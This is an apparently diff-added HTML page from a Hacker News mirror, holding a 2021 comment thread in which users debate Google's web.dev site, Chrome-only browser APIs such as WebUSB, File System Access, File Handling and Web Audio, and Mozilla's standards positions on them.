+            &gt; As someone who dabbles with Arduino<p>And you&#x27;ve just picked another extreme niche, like flashing Android ROMs.<p>Here&#x27;s the problem with things like WebUSB that Google injects into Chrome: It&#x27;s going out to over a billion users, including seniors, enterprise environments, and the technologically inept. And it introduces security risks. Why would anyone launch WebUSB out to, say, my grandma, just because maybe 100,000 people in the world might use features that require websites directly talk to a USB device?<p>Ironically, I could tell you how Google could fix this right now, but I&#x27;m confident they won&#x27;t do it because it&#x27;s not Googley enough: Leave it and a dozen similarly obscure web features permanently disabled by default behind an about:config flag. Google is obsessed with making things &quot;just work&quot;, so they enable everything, even though something like WebUSB will only ever be used by people who are doing something sophisticated enough that flipping an about:config flag is in their wheelhouse.<p>As an IT admin, what&#x27;s really frustrating is having to edit group policy every month to disable each and every new security hole and pop-up call-to-action feature browsers introduced that month. (Google is not alone in this, Firefox is guilty too to some extent, and Edge clones all of Google&#x27;s bad ideas, of course.)<p>And for people at home, the thing is, non-technical users approve everything. They hit that accept button on every bloody prompt they get. And I know this because I spent a lot of time cleaning out the Privacy permissions tab on people&#x27;s browsers when they have problems. &quot;Why are three porn sites able to send desktop notifications on this browser?&quot; Who the heck knows?<p>Just to make it easier for you to play with an Arduino, everyone else shouldn&#x27;t have to play whack-a-mole with &quot;features&quot; silently injected into their browser via evergreen updates.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=JohnWhigham" target="_blank">JohnWhigham</a>   <span class="timeago" data-date="2021-06-14 13:55:41 &#43;0000 UTC">2021-06-14 13:55:41 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Google doesn&#x27;t give a shit about open web standard standards, rather they want to push their standards onto the open web.<p>The entire website should be treated with extreme suspicion. It&#x27;s all the more insidious given the URL.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=drenvuk" target="_blank">drenvuk</a>   <span class="timeago" data-date="2021-06-14 15:53:23 &#43;0000 UTC">2021-06-14 15:53:23 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            The filesystem api would actually be a godsend regardless of whether if it would be limited to a single site owned directory or not.  Right now we&#x27;re limited to indexedDB, which is better than before where we only had localStorage, but persistence is a constant concern.  I am always worried about whether the browser will just up and delete things.  If they make everything be private and unsharable i.e. limited to a single domain, that includes no sharing between subdomains it would be perfectly viable.<p>The most important thing to note here is that we&#x27;re looking to escape vendor control.  A lot of people miss that.  If browsers can get feature parity with apps that means no more app stores.  no more app stores means more freedom of choice.  Maybe that&#x27;s not good for grandma but it&#x27;s good for you and me.<p>There are a few decisions by chrome developers that I will never support, like a bunch of stuff in Manifest V3 but hopefully with other browser companies will provide a way around boneheaded, selfish corporate decisions while we reap the benefits of better integration with the operation system.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=machello13" target="_blank">machello13</a>   <span class="timeago" data-date="2021-06-14 13:55:34 &#43;0000 UTC">2021-06-14 13:55:34 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; it likely won&#x27;t be coming to Firefox at all, as they consider it harmful<p>Yikes. The original article should have definitely mentioned this, if it were not just a Google mouthpiece.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=tyingq" target="_blank">tyingq</a>   <span class="timeago" data-date="2021-06-14 13:57:21 &#43;0000 UTC">2021-06-14 13:57:21 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Web.dev alparently launched in 2018. Here&#x27;s a story from when it went live: <a href="https:&#x2F;&#x2F;sdtimes.com&#x2F;webdev&#x2F;google-launches-new-website-for-web-developers&#x2F;" rel="nofollow">https:&#x2F;&#x2F;sdtimes.com&#x2F;webdev&#x2F;google-launches-new-website-for-w...</a>
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=dfabulich" target="_blank">dfabulich</a>   <span class="timeago" data-date="2021-06-14 14:34:14 &#43;0000 UTC">2021-06-14 14:34:14 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            That link you posted is referring to a completely different API, the File System Access API. There are a bunch of different APIs with extremely similar names in this space, with very different levels of browser support.<p>1. FileSystem API: (Note that this is one word, &quot;FileSystem.&quot;) This deprecated API simulates a local file system that web apps can navigate around. With this API, you can develop apps that can read, write, and create files and directories in a sandboxed, virtual file system, but you can&#x27;t use it to access files in the user&#x27;s Documents folder.<p>You can polyfill this API, and IMO it&#x27;s not very useful. It&#x27;s typically backed by actual files, but there&#x27;s no expectation that users will directly access that folder.<p><a href="https:&#x2F;&#x2F;caniuse.com&#x2F;filesystem" rel="nofollow">https:&#x2F;&#x2F;caniuse.com&#x2F;filesystem</a>
+<a href="https:&#x2F;&#x2F;caniuse.com&#x2F;mdn-api_filesystem" rel="nofollow">https:&#x2F;&#x2F;caniuse.com&#x2F;mdn-api_filesystem</a><p>2. File System Access API (formerly known as Native File System API and prior to that it was called Writeable Files API): This API lets webapps launch a picker to select a file or folder; from then on, the webapp can write to that file&#x2F;folder without prompting the user (until you close the tab).<p>Without this API, if your webapp has a file you&#x27;d like to write, all you can do is let the user download it. Downloaded files always either automagically appear in the Downloads folder (and do not permit overwriting existing files; identical names get autorenamed), or they launch a picker, which nags the user with &quot;Are you sure your want to replace this file?&quot;<p>The FSA API cannot be polyfilled, and it&#x27;s impossible-ish to implement a good web-based text editor without it. (Imagine if your favorite editor could only generate new files and never overwrite old ones, or if it nagged you &quot;are you sure?&quot; every time you tried to save your changes.)<p>That&#x27;s the API you linked to above. There, a guy says he thinks it should be harmful, but that&#x27;s not the standards position that Mozilla actually adopted. They currently mark it as &quot;defer&quot; (though they may decide to come around and mark it &quot;harmful&quot;) <a href="https:&#x2F;&#x2F;mozilla.github.io&#x2F;standards-positions&#x2F;#native-file-system" rel="nofollow">https:&#x2F;&#x2F;mozilla.github.io&#x2F;standards-positions&#x2F;#native-file-s...</a><p><a href="https:&#x2F;&#x2F;caniuse.com&#x2F;native-filesystem-api" rel="nofollow">https:&#x2F;&#x2F;caniuse.com&#x2F;native-filesystem-api</a><p>3. File Handling API: This is what TFA is about. It allows your webapp to say &quot;I handle .txt files; when someone double clicks on a .txt file, open it in my webapp.&quot;<p>Mozilla lists this API as &quot;defer&quot; as well. <a href="https:&#x2F;&#x2F;mozilla.github.io&#x2F;standards-positions&#x2F;#wicg-file-handling" rel="nofollow">https:&#x2F;&#x2F;mozilla.github.io&#x2F;standards-positions&#x2F;#wicg-file-han...</a><p><a href="https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;standards-positions&#x2F;issues&#x2F;158" rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;standards-positions&#x2F;issues&#x2F;158</a> is where they discussed that. (Note this is issue 158, as opposed to issue 154 in your link.) I agree with Mozilla that it makes no sense to implement the File Handling API without the File System Access API.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=kevingadd" target="_blank">kevingadd</a>   <span class="timeago" data-date="2021-06-14 14:16:53 &#43;0000 UTC">2021-06-14 14:16:53 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            You&#x27;re not being conspiratorial at all. At some point in the last decade the Chrome organization decided that they would pull their own version of classic IE where between WebExtensions&#x2F;Chrome Apps (their own conveniently proprietary &quot;web&quot; standards... at least they killed chrome apps) and massive piles of half-assed bespoke APIs that no competitor can afford to implement, they would ensure that Blink was the only &quot;web&quot; capable of running lots of new software.<p>While it wasn&#x27;t the first example of this, I think Web Audio set the standard for this pattern - individual Chrome contributors making their best effort to design and implement a cool API, but then the org&#x27;s scheduling and priorities result in it shipping before it&#x27;s remotely ready and before other browser vendors have meaningfully contributed to the process. This early ship date combined with Google&#x27;s market power results in applications building on top of these immature APIs, which means that other vendors have no choice but to implement and ship absolute garbage.<p>Web Audio is a great example because they kicked that steaming pile out the door in order to enable (Chrome-only, naturally) web ports of things like Angry Birds, even though in practice that API was barely usable for anything and had all sorts of undesirable characteristics that still aren&#x27;t completely fixed nearly a decade later. At the time Mozilla was working on a design and implementation for an API that was actually good, but Google&#x27;s unilateral move killed any chance of a good solution being shipped by multiple vendors.<p>Other Chrome-only APIs have been similar stories, though at least Native Client&#x2F;Pepper - probably the worst example - failed because the doomed design and implementation made it impossible for it to even hit their own production targets and drove app developers (like Unity) away.<p>In some cases you can meaningfully argue that other vendors are just dragging their feet - Safari being the main example, where they simply have been years late to ship useful things that both FF and Chrome had - but in practice nobody else has the massive development resources Google has to waste on dead-end trash APIs and nobody wants to pay the cost of implementing something they&#x27;ll have to throw out a year later with the knowledge that websites won&#x27;t support their browser anyway.<p>The meaningful security&#x2F;privacy concerns Apple and Mozilla use to reject new Google APIs are also a good example, because Google has the resources to just address these security issues via brute force. They can unilaterally deprecate an existing API and break tons of websites (Web Audio, video, etc) or just ship something busted and rapidly rework it to try and paper over the consequences (WebMidi etc being used for fingerprinting...)<p>In my time working on the nacl (then WebAssembly) team it became clear to me that most of the devs there weren&#x27;t acting on malicious motives, the overall structure and priorities of Google as a whole just produced bad outcomes. Sadly with their de-facto monopoly there&#x27;s no pressures to fix that.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 15:27:48 &#43;0000 UTC">2021-06-14 15:27:48 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I think you’re discounting that everything Chrome does these days is designed to become a web standard, unlike IE which was trying to have browser-only features for lock-in.<p>Chrome does seem to be somewhat hasty, which can have a similar effect in practice. But it might seem different if you actually want a feature and don’t want to wait years for it?<p>I don’t think Web Audio is as bad as you say. There is the ScriptProcessorNode which is getting deprecated in favor of audio worklets because having JavaScript processing audio on the foreground thread is a bad idea. But other than that, it seems nice for making simple audio processing graphs, and the infrastructure for putting JavaScript in the background took a while to work out.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=kevingadd" target="_blank">kevingadd</a>   <span class="timeago" data-date="2021-06-14 16:24:29 &#43;0000 UTC">2021-06-14 16:24:29 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Just look at how many revisions the W3 spec has had. It had even more churn that wasn&#x27;t visible there... IIRC it originally shipped with synchronous audio decoding on the main thread for some reason. Chrome has also shipped multiple p0&#x2F;p1 level bugs in Web Audio that users had to wait weeks or months for fixes to, like a while back when they introduced a priority inversion while rewriting their whole mixer so audio was just completely broken for a double-digit % of their userbase.<p>They also treated basic use cases like &#x27;pause a piece of playing audio&#x27; as out of scope, which is simply bizarre.<p>Every web app or port I&#x27;ve ever touched had issues caused by the poor design and quality of the API.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 16:39:20 &#43;0000 UTC">2021-06-14 16:39:20 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Okay, as someone who just used it for a few demo projects, I didn’t push it very hard. Thanks for explaining in more detail.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=Raed667" target="_blank">Raed667</a>   <span class="timeago" data-date="2021-06-14 14:19:15 &#43;0000 UTC">2021-06-14 14:19:15 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This will definitely go against the general consensus here; but as a frontend developer the association of Google and web.dev has never been a mystery to me or my team.<p>I don&#x27;t think it is even a case of hiding at all. just a short domain handy to be linked to during talks, presentations etc...
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=nemetroid" target="_blank">nemetroid</a>   <span class="timeago" data-date="2021-06-14 14:23:57 &#43;0000 UTC">2021-06-14 14:23:57 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Presumably because you already know about the association. The ”about” page doesn’t even mention it. The only hint is the footer.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=" target="_blank"></a>   <span class="timeago" data-date="2021-06-14 14:24:35 &#43;0000 UTC">2021-06-14 14:24:35 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=zemo" target="_blank">zemo</a>   <span class="timeago" data-date="2021-06-14 14:39:47 &#43;0000 UTC">2021-06-14 14:39:47 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Google and the other cloud companies&#x27; strategy is mostly all the same: they want to charge rent on every computer application possible. What has started to change in popular perception is the image of the cloud providers having all of your data. Why should they have all of my data? A reasonable reaction to the status quo of cloud applications.<p>This is just as nefarious as a traditional SAAS application, if not more so. Google is setting up a system whereby you can have the data on your own machine, but the actual logic of how to interpret the data is still loaded off of a server on-demand, with the end goal being that they can charge you rent to access files on your own device. Pretty cool for them, but seems like a raw deal for the end-user.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=api" target="_blank">api</a>   <span class="timeago" data-date="2021-06-14 14:42:51 &#43;0000 UTC">2021-06-14 14:42:51 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            The &quot;free as in beer&quot; software movement normalized the idea that locally run software should all be free, so the center of new software development moved to a cloud-first model. The cloud is the only DRM that works, so cloud software can never be pirated either.<p>&quot;We need to liberate ourselves from closed-source software!&quot;<p>Result: the software moves where it can&#x27;t be liberated.<p>It&#x27;s not some big conspiracy. It&#x27;s like how a plant grows toward the sun. It&#x27;s that software is very labor intensive to produce and there must be an economic model. If there&#x27;s no economic model in one place, it goes somewhere else where there is.<p>If we want computing to be open, free, and user-centric (rather than user-exploiting), we have to restructure the industry so that that&#x27;s where the money is.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=aYsY4dDQ2NrcNzA" target="_blank">aYsY4dDQ2NrcNzA</a>   <span class="timeago" data-date="2021-06-14 16:52:44 &#43;0000 UTC">2021-06-14 16:52:44 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Honest question: restructure it how?<p>The link to a succinct explanation would be much appreciated.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+    
+</article>
+
+    </main>
+    <footer>
+        <span class="h-logo">&copy; Hugo Hacker News</span><br/>
+        Site created By <a href="https://davidejones.com" target="_blank">David E Jones</a> Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> and the <a href="https://github.com/HackerNews/API" target="_blank">Hacker News api</a>.
+        <ul>
+            
+                <li><a href="/hugo-hn/guidelines/">Guidelines</a></li>
+            
+                <li><a href="/hugo-hn/faq/">FAQ</a></li>
+            
+                <li><a href="mailto:hn@ycombinator.com">Support</a></li>
+            
+                <li><a href="https://github.com/HackerNews/API">API</a></li>
+            
+                <li><a href="/hugo-hn/security/">Security</a></li>
+            
+                <li><a href="/hugo-hn/lists/">Lists</a></li>
+            
+                <li><a href="https://news.ycombinator.com/bookmarklet.html">Bookmarklet</a></li>
+            
+                <li><a href="/hugo-hn/dmca/">DMCA</a></li>
+            
+                <li><a href="http://www.ycombinator.com/apply/">Apply to YC</a></li>
+            
+                <li><a href="mailto:hn@ycombinator.com">Contact</a></li>
+            
+        </ul>
+    </footer>
+
+    
+    
+    
+    
+    
+    
+    <script type="text/javascript" src="https://davidejones.github.io/hugo-hn/main.01d140732eee0e8adfdb7a7f714755097c6676bfb8e8bf27645ce342b2ed12a481b08f6838c413c20bff3acf20f6159b3336339a220ff5ec5e45eb7877106361.js"  integrity="sha512-AdFAcy7uDorf23p/cUdVCXxmdr&#43;46L8nZFzjQrLtEqSBsI9oOMQTwgv/Os8g9hWbMzYzmiIP9exeRet4dxBjYQ=="  crossorigin="anonymous" defer></script>
+</body>
+</html>
+
